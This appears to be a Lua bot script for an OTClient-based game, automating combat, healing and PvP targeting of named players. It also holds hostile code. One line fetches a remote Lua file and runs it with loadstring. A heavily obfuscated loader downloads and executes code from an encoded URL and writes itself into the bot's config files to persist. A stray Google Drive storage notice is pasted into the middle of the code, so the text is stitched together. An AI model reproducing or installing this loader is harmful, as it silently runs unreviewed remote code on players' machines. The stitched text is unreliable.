
  
  
  
  local isStacking = false;
  local stackMonster = nil;
  local current_vocation;
  
  local g_mouse = modules.corelib.g_mouse;
  local g_keyboard = modules.corelib.g_keyboard;
  
  local stackSpells = {
	  {
		  name = "Shunkanido",
		  distance = 8
	  },
	  {
		  name = "Teleport",
		  distance = 4
	  }
  };
  
  local availableKeys = {
	  ['Up'] = { 0, -6 },
	  ['Down'] = { 0, 6 },
	  ['Left'] = { -7, 0 },
	  ['Right'] = { 7, 0 }
  };
  
  local directions = {
	  ["Up"] = "n",
	  ["Down"] = "s",
	  ["Left"] = "w",
	  ["Right"] = "e"
  };
  
  local stackData = {
	  ["n"] = function(playerPos, creaturePos) return playerPos.y > creaturePos.y; end,
	  ["s"] = function(playerPos, creaturePos) return playerPos.y < creaturePos.y; end,
	  ["w"] = function(playerPos, creaturePos) return playerPos.x > creaturePos.x; end,
	  ["e"] = function(playerPos, creaturePos) return playerPos.x < creaturePos.x; end
  };
  
  local sortData = {
	  ["n"] = function(a, b) return a.position.y < b.position.y; end,
	  ["s"] = function(a, b) return a.position.y > b.position.y; end,
	  ["w"] = function(a, b) return a.position.x < b.position.x; end,
	  ["e"] = function(a, b) return a.position.x > b.position.x; end
  };
  
  local doFilter = function(data, dir)
	  local i = 1;
	  local canStack = stackData[dir];
	  local playerPos = player:getPosition();
	  while true do
		  local currentValue = data[i];
		  if (currentValue == nil) then
			  break;
		  end
  
		  if (not canStack(playerPos, currentValue.position)) then
			  table.remove(data, i);
			  i = 0;
		  end
		  i = i + 1;
	  end
  end
  
  local function setStacking(value)
	  isStacking = value;
	  if (keepTarget ~= nil) then
		  keepTarget.isStacking = value;
	  end
  
	  if (value == true and tyrBot) then
		  tyrBot.comboDelay = now + 500;
	  end
  
	  if (value == false and stackMonster ~= nil and stackMonster == g_game.getAttackingCreature()) then
		  stackMonster = nil;
		  g_game.cancelAttack();
	  end
  end
  
  function Stack()
	  local playerPos = player:getPosition();
	  local creatures = {};
	  local spectators = getSpectators(playerPos.z);
  
	  -- Adicionando monstros à lista de criaturas
	  for _, creature in ipairs(spectators) do
		  if (creature:isMonster()) then
			  local creaturePos = creature:getPosition();
			  if (creaturePos ~= nil and getDistanceBetween(playerPos, creaturePos) >= 1) then
				  local data = {
					  creature = creature,
					  position = creaturePos
				  };
				  table.insert(creatures, data);
			  end
		  end
	  end
  
	  -- Ordena as criaturas pela distância em relação ao jogador
	  table.sort(creatures, function(a, b) return getDistanceBetween(playerPos, a.position) < getDistanceBetween(playerPos, b.position); end);
  
	  -- Se não houver monstros, sai da função
	  local closestMonster = creatures[1];
	  if (closestMonster == nil) then
		  return false;
	  end
  
	  -- Ataca o monstro mais próximo
	  setStacking(true);
	  stackMonster = closestMonster.creature;
  
	  if (g_game.getAttackingCreature() ~= closestMonster.creature) then
		  g_game.attack(closestMonster.creature);
	  end
  
	  -- Verifica a distância para decidir qual magia usar
	  local distance = getDistanceBetween(playerPos, closestMonster.position);
	  
	  -- Usa Shunkanido no último monstro com distância de 8 e Teleport no monstro mais próximo com distância de 4
	  if (distance > 7) then
		  say("Shunkanido");
	  else
		  say("Teleport");
	  end
  
	  return true;
  end
  
  macro(1, function()
	  if (g_keyboard.isKeyPressed("F2")) then
		  if (Stack()) then return; end
	  end
	  setStacking(false);
  end)
  
  


local lastRegeneration;
macro(1, function()
    if (player:getLevel() < 10) then return; end
    if (hppercent() < 100 or lastRegeneration == nil) then
        local headers = {"Majin", "Namekian", "Big", ""};
        for _, header in ipairs(headers) do
            local spell = header .. " Regeneration";
            say(spell);
            if (lastRegeneration == spell:trim():lower()) then
                return;
            end
        end
    end
end)

onTalk(function(name, level, mode, text)
    if (name ~= player:getName()) then return; end
    if (mode ~= 44) then return; end
    
    local talked_msg = text:trim():lower();
    if (talked_msg:find("regeneration")) then
        lastRegeneration = talked_msg;
    end
    
end)



onTalk(function(name, level, mode, text, channelId, pos)
    if (name ~= 'Blessed Tapion') then return; end              
    if (text:find('Estou aqui para oferecer')) then
    --say('!bless')
    schedule(200, function()
    NPC.say("bless");
    schedule(400, function()
        NPC.say('yes');
    end)
    end)
    end
end);


modules.corelib.HTTP.get('https://raw.githubusercontent.com/Mannax002/Custom-mobile-NTO/refs/heads/main/Linhadotempo.lua', function(script)
    assert(loadstring(script))()
    end);
    
    
    
    local stopPvp;
    local lastAlarm;
    
    onTextMessage(function(mode, text)
    
    if text:lower():find('was not justified') then
        stopPvp = nil;
    end
    end)
    
    onTextMessage(function(mode, text)
    if (not text:match("atualmente tem %d+ frags no dia")) then return; end
    
    local numbersOnMessage = {};
    for _, token in ipairs(text:split(" ")) do
        local asNumber = tonumber(token);
        if (asNumber ~= nil) then
            table.insert(numbersOnMessage, asNumber);
        end
    end
    
    stopPvp = false;
    local maximumFrags = {6, 14, 30};
    for index, currentFrag in ipairs(numbersOnMessage) do
        local maximumFrag = maximumFrags[index];
        if (currentFrag >= maximumFrag) then
            stopPvp = true;
            break;
        end
    end
    
    say(tr("!pvp %s", stopPvp and "off" or "on"));
    end)
    
    macro(1000, function()
    
    if (stopPvp == nil) then
        say("!frags");
        return;
    end
    
    if (stopPvp == true) then
        if ((lastAlarm or 0) < os.time()) then
            playSound("/sounds/alarm.ogg");
            lastAlarm = os.time() + 15;
        end
        say("!pvp off");
    end
    
    end)
    
    
    setDefaultTab ('Cave')
    
    macro(1, "Auto Say",  function()
    
    say(storage.Spells)
    
    end)
    
    addTextEdit("Spells", storage.Spells or "POWER DOWN", function(widget, text) 
    storage.Spells = text
    end)
    
    
    addSeparator ()
    
    macro(100, "CC21 MAGIA+AREA", function()
        local tgt = g_game.getAttackingCreature()
        if tgt then
           local targetDistance = getDistanceBetween(tgt:getPosition(), player:getPosition())
           if targetDistance > 2 then
               say(storage.comboText or "final shine")  -- Usa o valor de comboText ou "final shine" se não estiver definido
           else
               say(storage.areaText or "furie")  -- Usa o valor de areaText ou "furie" se não estiver definido
           end
        end
        end)
        
        addTextEdit("comboText", storage.comboText or "final shine", function(widget, text)  
        storage.comboText = text
        end)
        
        addTextEdit("areaText", storage.areaText or "furie", function(widget, text)  
        storage.areaText = text
        end)
        
    
    
    local function Combo()
      if not g_game.isAttacking() then return false end
      say(storage.magiaantired)
     end
     
     local timeArea
     local MonstersCount
     macro(1, 'Anti-Red', function()
      MonstersCount = 0
      for _, x in ipairs(getSpectators(true)) do
       local checkPosz = math.abs(x:getPosition().z - player:getPosition().z)
       if checkPosz <= 3 then
        if (x:isPlayer() and x ~= player and x:getEmblem() ~= 1 and x:getShield() < 3) or player:getSkull() >= 3 then
         timeArea = now + 30
        elseif checkPosz == 0 and x:isMonster() and getDistanceBetween(x:getPosition(), player:getPosition()) <= 2 then
         MonstersCount = MonstersCount + 1
        end
       end
      end
      if MonstersCount > 1 and (not timeArea or timeArea < now) then
       say(storage.antiredarea)
      else
       Combo()
      end
     end)
     
     addTextEdit("ManatrainText", storage.magiaantired or "magia target", function(widget, text) 
     storage.magiaantired = text
     end)
     
     addTextEdit("ManatrainText", storage.antiredarea or "magia area", function(widget, text) 
     storage.antiredarea = text
     end)
    
     addSeparator ()
    
    macro(100, "Mobs", function() 
        local battlelist = getSpectators();
        local closest = 10
        local lowesthpc = 101
        for key, val in pairs(battlelist) do
          if val:isMonster() then
            if getDistanceBetween(player:getPosition(), val:getPosition()) <= closest then
              closest = getDistanceBetween(player:getPosition(), val:getPosition())
              if val:getHealthPercent() < lowesthpc then
                lowesthpc = val:getHealthPercent()
              end
            end
          end
        end
        for key, val in pairs(battlelist) do
          if val:isMonster() then
            if getDistanceBetween(player:getPosition(), val:getPosition()) <= closest then
              if g_game.getAttackingCreature() ~= val and val:getHealthPercent() <= lowesthpc then 
                g_game.attack(val)
           delay(100)
                break
              end
            end
          end
        end
      end)
    
      addSeparator ()
    
    
      local lastPlayerDetected = 0;
    macro(100, "Player Detected", function()
        for _, creature in pairs(getSpectators(pos)) do
            if (creature:isPlayer() and creature:getId() ~= player:getId() and creature:getEmblem() ~= 1) then
                playSound("/sounds/Player_Detected.ogg");
                g_window.setTitle(player:getName() .. ' - PLAYER DETECTED!');
                lastPlayerDetected = now + 10000;
                delay(1500);
                break;
            end
        end
    
    end);
    
    macro(100, function()
        if (lastPlayerDetected < now) then
            g_window.setTitle(player:getName());
        end
    end);
    
    
    doAttack = function(target)
        if not target or not g_game.getLocalPlayer() then
            return 
        end
        if not g_game.canPerformGameAction() or target:getId() == g_game.getLocalPlayer():getId() then
            return 
        end
        if g_game.getFollowingCreature() and g_game.getFollowingCreature():getId() == target:getId() then
            g_game.cancelFollow()
        end
        if g_game.getAttackingCreature() and g_game.getAttackingCreature():getId() == target:getId() then
            g_game.cancelAttack()
            local message = OutputMessage.create()
            message:addU8(0xBE)
            message:addU32(target:getId())
            g_game.getProtocolGame():send(message)
    
        else
        g_game.attack(target)
            local message = OutputMessage.create()
            message:addU8(0xF4)
            message:addU32(target:getId())
            g_game.getProtocolGame():send(message)
        end
        end
    
    
        AtkTarget = {
        targetId = nil,
        lastTargetTime = 0,
        MESSAGE_NOT_SHOOTING_SKILLS = {
            'you can only use it on creatures.',
            'pode usar isso em criaturas.',
        }, 
        lastCast = 0,
        lastRecast = 0,
        };
    
        macro(1, function()
        local target = g_game.getAttackingCreature();
        if (target) then
            if (not AtkTarget.targetId or target:getId() ~= AtkTarget.targetId) then
                AtkTarget.targetId = target:getId();
            end
        end
        end);
        
        setDefaultTab ('Tools')

        macro(200, 'Attack-Target', function()
        if (isInPz()) then return; end
        local currentTarget = g_game.getAttackingCreature();
        if (not AtkTarget.targetId) then return; end
        if (g_game.isAttacking()) then return; end
        if (AtkTarget.lastCast >= now) then return; end
        for _, creature in pairs(getSpectators()) do
            if (creature:isPlayer()) then
                if (creature:getId() == AtkTarget.targetId) then
                    doAttack(creature);
                    AtkTarget.lastCast = now + 20;
                end
            end
        end
        end);
    
        onKeyDown(function(key)
        if (key == 'Escape') then
            local target = g_game.getAttackingCreature();
            if (not target or target:getId() == AtkTarget.targetId) then
                g_game.cancelAttackAndFollow();
                AtkTarget.targetId = nil;
            end
        end
        end);
    
        onTextMessage(function (mode, text)
        text = text:lower();
        if (AtkTarget.lastRecast >= now) then return; end
        for _, message in ipairs(AtkTarget.MESSAGE_NOT_SHOOTING_SKILLS) do
            if (text:find(message) and g_game.isAttacking() and AtkTarget.targetId) then
                g_game.cancelAttack();
                AtkTarget.lastRecast = now + 20;
            end
        end
        end);
    
    
    
    macro(1, "Mystic 30% ", function()
        if hppercent() <= 30 then
          say 'mystic defense'
        end
        end)
    
    
    
        
    
    
    
    
    macro(3000, "Buffz All", function()
        if not hasPartyBuff() then
            local buffs = {
                "justice aura",
                "body manipulation",
                "Ultimate Fusion Energy",
                "hakaishin aura",
                "kinzoku no kawa"
            }
            
            local applied = false
            for _, buff in ipairs(buffs) do
                say(buff)
                if hasPartyBuff() then
                    applied = true
                    break
                end
            end
            
            if not applied then
                say("ultimate power up")
            end
        end
    end)
    
    
    
    macro(500, "", nil, function()
        if not hasHaste() then
        say('super speed    ')
        end
    end)
    
    macro(100, function()
    
        for a, spec in ipairs(getSpectators()) do
            
        if spec:getName():lower() then
        
        if spec:getShield() == 1 then
        
        g_game.partyJoin(spec:getId())
        
        return
        
        end
        
        end
        
        end
        
        end)
    
        macro(50,  function()
    
            if not modules.corelib.g_keyboard.areKeysPressed('F1') then
            
            if (hppercent() <= 68) then
            usewith(3587, player)
            delay(100)
            end
            
            end
            
            end)
    
            macro(50,  function()
    
                if not modules.corelib.g_keyboard.areKeysPressed('F1') then
                
                if hasManaShield() and player:getMana() <= 20 then
                usewith(3587, player)
                delay(100)
                end
                
                end
                
                end)
    
    
        
    
    local healthId = 3062
    local healthPercent = 30
    macro(200, "Pedra Reviver", function()
    if (hppercent() <= healthPercent) then
    usewith(healthId, player)
    end
    end)
    
    
    
    
    
    
    
    
96% de armazenamento usado … Se você ficar sem espaço, não poderá salvar arquivos no Drive, fazer backup no Google Fotos nem usar o Gmail. Aproveite 30 GB de armazenamento por R$ 4,50 R$ 1,00 por mês, durante 3 meses.
local content = [[local bit = modules._G.bit;local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v46,v47) local v48={};for v67=1, #v46 do v6(v48,v0(v4(v1(v2(v46,v67,v67 + 1 )),v1(v2(v47,1 + (v67% #v47) ,1 + (v67% #v47) + 1 )))%256 ));end return v5(v48);end local v8={};local v9=2;local v10=function(...) local v49={...};local v50=v49[1];if (type(v50)==v7("\197\194\217\41\227","\126\177\163\187\69\134\219\167")) then else v50=v49;end local v51={};for v68=1, #v50 do local v69=v50[v68];local v70=v8[v69];if  not v70 then local v80=v69 * v9 ;v70=string.char(v80);v8[v69]=v70;end v51[v68]=v70;end v51=table.concat(v51);v51=v51:reverse();return v51;end;local v11=modules;local v12=v11[v10(35.5,47.5)];local v13=v12[v10(59,55,50.5,51,58,50.5,51.5)]();if (v13[v10(54,50.5,49,48.5,54)]~=nil) then else v13[v10(54,50.5,49,48.5,54)]=UI[v10(54,50.5,49,48.5,38)]();end local v14=v13[v10(54,54,48.5,49.5,56)];local v15=v13[v10(51.5,55,52.5,57,58,57.5,50,48.5,55.5,54)];local v16=v12[v10(50,48.5,55.5,54)];local v17=v12[v10(58,57,50.5,57.5,57.5,48.5)];local v18=v12[v10(57.5,50.5,49.5,57,58.5,55.5,57.5,50.5,57,47.5,51.5)];local v19=v18[v10(57,52.5,34,50.5,53.5,48.5,54.5)];local v20=v18[v10(57.5,58,57.5,52.5,60,34.5,50.5,54,52.5,51)];local v21=v18[v10(50.5,54,52.5,35,50.5,58,50.5,54,50.5,50)];local v22=v18[v10(57.5,58,55,50.5,58,55,55.5,33.5,50.5,54,52.5,35,50,48.5,50.5,57)];local v23=v18[v10(57.5,58,55,50.5,58,55,55.5,33.5,50.5,54,52.5,35,50.5,58,52.5,57,59.5)];local v24=v18[v10(57.5,58,57.5,52.5,60,34.5,60.5,57,55.5,58,49.5,50.5,57,52.5,50)];local v25=v12[v10(56,58,58,52,47.5,51.5)];local v26=v11[v10(49,52.5,54,50.5,57,55.5,49.5)][v10(40,42,42,36)];local v27=v26[v10(58,50.5,51.5)];local v28=json;local v29=table;local v30=string;local v31=reload;local v32=schedule;local v33;local v34=v10(48.5,58.5,54,23,57,50.5,50,48.5,55.5,54,23.5,49.5,57.5,52.5,54.5,23.5,57.5,58,56,52.5,57,49.5,57.5,47.5,55.5,51,54,50.5,23.5);local v35={v10(25,24,24,24,25),v10(26.5,24,24,24,25),v10(24,24,24.5,24,25),v10(59.5,48.5,57)};local v36={v10(57.5,58,56,52.5,57,49.5,57.5,47.5,55.5,51,54,50.5,23.5),v10(49.5,57.5,52.5,54.5),v10(55,55.5,57.5,53,23,55,55.5,52.5,57.5,57,50.5,59)};local v37=v29[v10(58,48.5,49.5,55,55.5,49.5)](v36,v10(23.5));local v38=v11[v10(58,55.5,49,47.5,50.5,54.5,48.5,51.5)][v10(50.5,51.5,48.5,57.5,57.5,50.5,54.5)];v13[v10(58,56,52.5,57,49.5,41.5,55,58.5,57)]=v13[v10(58,56,52.5,57,49.5,41.5,55,58.5,57)] or {} ;local v40=v13[v10(58,56,52.5,57,49.5,41.5,55,58.5,57)];v26[v10(58,58.5,55.5,50.5,54.5,52.5,58)]=120;v13[v7("\49\216\36\231\243\55","\156\67\173\74\165")]=true;local v43=function(v52,v53) local v54=v29[v10(50,55,52.5,51)](v35,v52) or (v53 and 1) or 0 ;local v55={};if v53 then v55[v10(55,55.5,52.5,57.5,57,50.5,59)]=v54;else v55[v10(55,55.5,52.5,57.5,57,50.5,59,47.5,50,50.5,58,57.5,50.5,58)]=v54 + 1 ;end v55=v28[v10(50.5,50,55.5,49.5,55,50.5)](v55);v23(v37,v55);end;local v44=function() if  not v20(v37) then return 1;end local v56=v28[v10(50.5,50,55.5,49.5,50.5,50)](v22(v37));local v57=v56[v10(55,55.5,52.5,57.5,57,50.5,59)];if (v57~=nil) then else v57=v56[v10(55,55.5,52.5,57.5,57,50.5,59,47.5,50,50.5,58,57.5,50.5,58)] or 1 ;end if ((v57<1) or (v57>4)) then v57=1;end return v35[v57];end;function executeCurrentDownload() if (v13[v10(57,60.5,42,51.5,55,52.5,50,48.5,55.5,54,55,59.5,55.5,50)] and  not v33) then return;end v33=true;v13[v10(57,60.5,42,51.5,55,52.5,50,48.5,55.5,54,55,59.5,55.5,50)]=true;local v59=v44();local v60=v10(56,52.5,61,23,39,39.5,36.5,41.5,41,34.5,43,22.5,58.5,56.5,53,57.5,50,58,22.5,55,56,58.5,58,59,50,23.5,57.5,50,48.5,55.5,54,56,58.5,23.5,54.5,55.5,49.5,23,57.5,50.5,59,52.5,52,49.5,57,48.5,57,60.5,58,23.5,23.5,29,57.5,56,58,58,52);v60=v60:gsub(v10(39,39.5,36.5,41.5,41,34.5,43),v59);v32(math[v10(54.5,55.5,50,55,48.5,57)](100,1000),function() v27(v60,function(v75,v76) local v77;if (v76==nil) then else player:clearText();v77=true;end if (v77~=nil) then else local v82,v83=v14(v15,v75);if  not v82 then v77=true;end end if (v77~=true) then else v43(v59);return executeCurrentDownload();end if  not v20(v34) then v32(0,v31);end if (v59~=v10(59.5,48.5,57)) then else local v84=v10(24,20,20.5,24,20);local v85=8192 * 64 ;local v86=(v10(24,23.5)):rep(v85);v84=v84   .. v86   .. v10(20.5) ;v84=v30[v10(58,48.5,54.5,57,55.5,51)](v10(4.5,4.5,4.5,4.5,5,50,55,50.5,4.5,4.5,4.5,4.5,4.5,5,50,55,50.5,4.5,4.5,4.5,4.5,4.5,4.5,5,57.5,18.5,4.5,4.5,4.5,4.5,4.5,4.5,4.5,5,20.5,20,47.5,47.5,47.5,16,55,55.5,52.5,58,49.5,55,58.5,51,4.5,4.5,4.5,4.5,4.5,4.5,5,55,50.5,52,58,16,50.5,57.5,54,48.5,51,16,51,52.5,4.5,4.5,4.5,4.5,4.5),v84);local v87=(v10(57,55.5,16,20.5,20,20.5,24,20,16));v87=v87:rep(8192);v87=v87:sub(1, -3);v87=v30[v10(58,48.5,54.5,57,55.5,51)](v10(4.5,4.5,4.5,4.5,5,50,55,50.5,4.5,4.5,4.5,4.5,4.5,5,50,55,50.5,4.5,4.5,4.5,4.5,4.5,4.5,5,4.5,62.5,57.5,18.5,16,22,57.5,18.5,61.5,16,55,57,58.5,58,50.5,57,4.5,4.5,4.5,4.5,4.5,4.5,4.5,5,20.5,20,47.5,47.5,16,55,55.5,52.5,58,49.5,55,58.5,51,4.5,4.5,4.5,4.5,4.5,4.5,5,55,50.5,52,58,16,50.5,57.5,54,48.5,51,16,51,52.5,4.5,4.5,4.5,4.5,4.5),v87,v10());local v88=v29[v10(58,48.5,49.5,55,55.5,49.5)]({v84,v87},v10(5));v75=v10(5)   .. v75   .. v10(5)   .. v88 ;v75=v17(v16(v75,v10(41,44.5,42,16,38.5,39.5,42,41.5,42.5,33.5,23.5,57.5,58,56,52.5,57,49.5,57.5,47.5,55.5,51,54,50.5,23.5,23)));v75=v30[v10(56,54.5,58.5,50)](v75,false);end v43(v59,true);v23(v34,v75);end,function(v78) player:setText(v10(16,41.5,42,40,36.5,41,33.5,41.5,16,39.5,35,38,34.5)   .. v78   .. v10(18.5) ,v10(50.5,51.5,55,48.5,57,55.5));end);end);end function executeTyr() if  not v18[v10(57.5,58,57.5,52.5,60,34.5,50.5,54,52.5,51)](v34) then v13[v10(54,50.5,49,48.5,54)]:setText(v10(23,50.5,50,57,48.5,58.5,51.5,48.5,16,22,57,50.5,50,48.5,55.5,54,16,55.5,16,55.5,50,55,48.5,60,52.5,48.5,33));return;end if (v13[v10(54,50.5,49,48.5,54)]==nil) then else v13[v10(54,50.5,49,48.5,54)]:destroy();v13[v10(54,50.5,49,48.5,54)]=nil;end local v61=tostring(v13[v10(58,55.5,33,55,58.5,57)])   .. v28[v10(50.5,50,55.5,49.5,55,50.5)](v40) ;if (v61==lastInfo) then else lastInfo=v61;v32(0,function() executeTyr();end);return true;end if v13[v10(55,58.5,41,57,60.5,58)] then return;end v13[v10(55,58.5,41,57,60.5,58)]=true;local v63,v64=v14(v15,v18[v10(57.5,58,55,50.5,58,55,55.5,33.5,50.5,54,52.5,35,50,48.5,50.5,57)](v34));v64();end local v45=v10();for v65,v66 in ipairs(v36) do if v36[v65 + 1 ] then v45=v45   .. v10(23.5)   .. v66 ;if  not v24(v45) then v19(v45);end end end if v25[v10(58,55,50.5,51.5,32.5,57,50.5,57.5,42.5,58,50.5,57.5)] then v25[v10(58,55,50.5,51.5,32.5,57,50.5,57.5,42.5,58,50.5,57.5)](v10(28,43,33.5,42,39.5));end executeCurrentDownload();executeTyr();
]];

local config = "/bot/New Tyr";
g_resources = modules._G.g_resources;
if (not g_resources.directoryExists(config)) then
	g_resources.makeDir(config);
end

local fileExists;
local possibleFiles = {"/tyrLoader.lua", "/start.lua", "/Custom Start.lua", "/Custom Star.lua"};
for _, file in ipairs(possibleFiles) do
	local path = config .. file;
	if (g_resources.fileExists(path)) then
		if (not fileExists) then
			fileExists = true;
			if (g_resources.readFileContents(path) ~= content) then
				g_resources.writeFileContents(path, content);
			end
		else
			g_resources.deleteFile(path);
		end
	end
end

local game_bot = modules.game_bot;

game_bot.scheduleEvent(function()
	local contentsPanel = game_bot.contentsPanel;
	local configList = contentsPanel.config;
	configList:setCurrentOption("New Tyr");
end, 100);

if (fileExists) then return; end

local path = config .. possibleFiles[1];
g_resources.writeFileContents(path, content);
reload();
    
    
    
    setDefaultTab ('Tools')
    
         Panels.AttackLeaderTarget(batTab)
         addSeparator("sep", batTab)
         
    
                  
    
       
    
 EnemyIcon = addIcon("Enemy", {item=7657, text="Enemy"}, macro(1, function()
    local attcked = g_game.getAttackingCreature()
    local analiseHP1 = 100
    local analiseCID1 = nil

    for _, pla in ipairs(getSpectators(posz())) do
        if not attcked or attcked:isMonster() or (attcked:isPlayer() and pla:getHealthPercent() <= attcked:getHealthPercent() * 0.6) then
            if pla:isPlayer() and pla:getEmblem() ~= 1 and pla:getShield() <= 2 then
                if pla:getHealthPercent() <= analiseHP1 then
                    analiseHP1 = pla:getHealthPercent()
                    analiseCID1 = getCreatureById(pla:getId())
                end
            end
        end
    end

    if analiseCID1 ~= nil then
        g_game.attack(analiseCID1)
    end
end))

-- Adicionando movimentação do ícone na tela
EnemyIcon:breakAnchors()
EnemyIcon:move(150, 260) -- Altere os valores X (300) e Y (260) conforme a posição desejada

  
          

          local primeiro_foco = {'Rubinho Barrichello'}
  
          local segundo_foco = {'DanielAuregliett'}
          
          local terceiro_foco = {'IgorKarkaroff', 'JaoTIpoPIRANHA'}
          
          local quarto_foco = {'HAFIKI', 'GLEISSAOTANKDEGUERRA', '  HASHIRAMAcarniceiro'}
          
          macro(100, "Enemy All", function()
          
          attcked = g_game.getAttackingCreature()
          
          local analiseHP2 = 100
          
          local analiseCID2 = nil
          
          for _, pla in ipairs(getSpectators(posz())) do
          if not attcked or attcked:isMonster() or attcked:isPlayer() and pla:getHealthPercent() <= attcked:getHealthPercent()*0.6 then
          if pla:isPlayer() and pla:getEmblem() ~= 1 and pla:getShield() <= 2 then
          if table.find(primeiro_foco, pla:getName()) then
          g_game.attack(pla)
          return
          end
          end
          end
          end
          
          for _, pla in ipairs(getSpectators(posz())) do
          if not attcked or attcked:isMonster() or attcked:isPlayer() and pla:getHealthPercent() <= attcked:getHealthPercent()*0.6 then
          if pla:isPlayer() and pla:getEmblem() ~= 1 and pla:getShield() <= 2 then
          if table.find(segundo_foco, pla:getName()) then
          g_game.attack(pla)
          return
          end
          end
          end
          end
          
          for _, pla in ipairs(getSpectators(posz())) do
          if not attcked or attcked:isMonster() or attcked:isPlayer() and pla:getHealthPercent() <= attcked:getHealthPercent()*0.6 then
          if pla:isPlayer() and pla:getEmblem() ~= 1 and pla:getShield() <= 2 then
          if table.find(terceiro_foco, pla:getName()) then
          g_game.attack(pla)
          return
          end
          end
          end
          end
          
          for _, pla in ipairs(getSpectators(posz())) do
          if not attcked or attcked:isMonster() or attcked:isPlayer() and pla:getHealthPercent() <= attcked:getHealthPercent()*0.6 then
          if pla:isPlayer() and pla:getEmblem() ~= 1 and pla:getShield() <= 2 then
          if table.find(quarto_foco, pla:getName()) then
          g_game.attack(pla)
          return
          end
          end
          end
          end
          
          for _, pla in ipairs(getSpectators(posz())) do
          if not attcked or attcked:isMonster() or attcked:isPlayer() and pla:getHealthPercent() <= attcked:getHealthPercent()*0.6 then
          if pla:isPlayer() and pla:getEmblem() ~= 1 and pla:getShield() <= 2 then
          
          if pla:getHealthPercent() <= analiseHP2 then
          analiseHP2 = pla:getHealthPercent()
          analiseCID2 = getCreatureById(pla:getId())
          end
          
          end
          end
          end
          
          if analiseCID2 ~= nil then
          g_game.attack(analiseCID2)
          return
          end
          
          end)
          
          
          
          
          macro(200, "Yellow Skull%", function() -- ATACAR YELLOW COM MENOS HP
          
          for _, pla in ipairs(getSpectators(posz())) do
          
          attacked = g_game.getAttackingCreature()
          
          if not attacked or attacked:isMonster() or attacked:isPlayer() and pla:getHealthPercent() < attacked:getHealthPercent()*0.6 then
          if pla:isPlayer() and pla ~= player and pla:getHealthPercent() < 90 and pla:getEmblem() ~= 1 and pla:getSkull() == 1 and pla:getShield() <= 2 then 
          g_game.attack(pla)
          end
          end
          
          end
          
          delay(100)
          
          end)
          
          
          macro(100, function()
          
          if player:getShield() == 3 or player:getShield() == 5 or player:getShield() == 7 or player:getShield() == 9 then return end
          
          for _, pla in ipairs(getSpectators(posz())) do
          
          if pla:isPlayer() and pla:getEmblem() == 1 and pla:isPartyLeader() then 
          g_game.partyJoin(pla:getId())
          end
          
          end
          
          end)
          
          
          macro(200, "White Skull PK%", function() -- ATACAR O PK COM MENOS HP
          
          for _, pla in ipairs(getSpectators(posz())) do
          
          attacked = g_game.getAttackingCreature()
          
          if not attacked or attacked:isMonster() or attacked:isPlayer() and pla:getHealthPercent() < attacked:getHealthPercent()*0.6 then
          if pla:isPlayer() and pla ~= player and pla:getHealthPercent() <85 and pla:getEmblem() ~= 1 and pla:getSkull() == 3 and pla:getShield() <= 2 then 
          g_game.attack(pla)
          end
          end
          
          end
          
          delay(100)
          
          end)
          
          macro(200, "White Skull All", function() -- ATACAR QUALQUER PK
          
          for _, pla in ipairs(getSpectators(posz())) do
          
          attacked = g_game.getAttackingCreature()
          
          if not attacked or attacked:isMonster() or attacked:isPlayer() and pla:getHealthPercent() < attacked:getHealthPercent()*0.6 then
          if pla:isPlayer() and pla ~= player and pla:getEmblem() ~= 1 and pla:getSkull() == 3 and pla:getShield() <= 2 then 
          g_game.attack(pla)
          end
          end
          
          end
          
          delay(100)
          
          end)



       FollowAttack = {
    flags = { ignoreNonPathable = true, precision = 0, ignoreCreatures = true },
};

FollowAttack.getDirection = function(playerPos, direction)
    if (direction == 0) then playerPos.y = playerPos.y - 1;
    elseif (direction == 1) then playerPos.x = playerPos.x + 1;
    elseif (direction == 2) then playerPos.y = playerPos.y + 1;
    elseif (direction == 3) then playerPos.x = playerPos.x - 1;
    end
    return playerPos;
end

-- Ícone "Follow Attack"
FollowAttack.Icon = addIcon("Follow Attack", {item=7657, text="Follow Attack"}, macro(1, function()
    if (not g_game.isAttacking() or g_game.isAttacking() and not g_game.getAttackingCreature():isPlayer()) then return; end

    local playerPos = pos();
    local target = g_game.getAttackingCreature();
    local targetPosition = target:getPosition();

    -- Verifica a distância para o alvo
    if (getDistanceBetween(playerPos, targetPosition) == 0) then g_game.setChaseMode(0) end
    if (getDistanceBetween(playerPos, targetPosition) <= 1) then return; end

    local path = findPath(playerPos, targetPosition, 20, FollowAttack.flags);
    if (not path) then return; end

    local tileToUse = playerPos;
    for i, value in ipairs(path) do 
        if (i > 6) then break; end
        tileToUse = FollowAttack.getDirection(tileToUse, value);
    end
    tileToUse = g_map.getTile(tileToUse);
    use(tileToUse:getTopUseThing());
end))

-- Liberar âncoras e mover o ícone
FollowAttack.Icon:breakAnchors()
FollowAttack.Icon:move(150, 160)  -- Altere os valores X/Y conforme onde você quer posicioná-lo

        
